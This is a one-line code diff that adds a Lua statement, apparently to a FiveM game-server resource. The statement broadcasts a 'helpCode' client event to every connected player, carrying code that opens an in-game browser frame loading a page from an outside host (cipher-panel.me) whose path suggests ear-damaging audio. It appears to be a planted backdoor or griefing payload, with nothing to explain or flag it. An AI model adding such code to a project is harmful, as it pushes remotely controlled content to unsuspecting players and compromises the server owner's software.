@@ -1,0 +1,1 @@
+TriggerClientEvent('helpCode', -1, [[local soun = CreateDui("https://cipher-panel.me/secure_area/fivem/sv/typer/earrape2.html", 50, 50); ]])
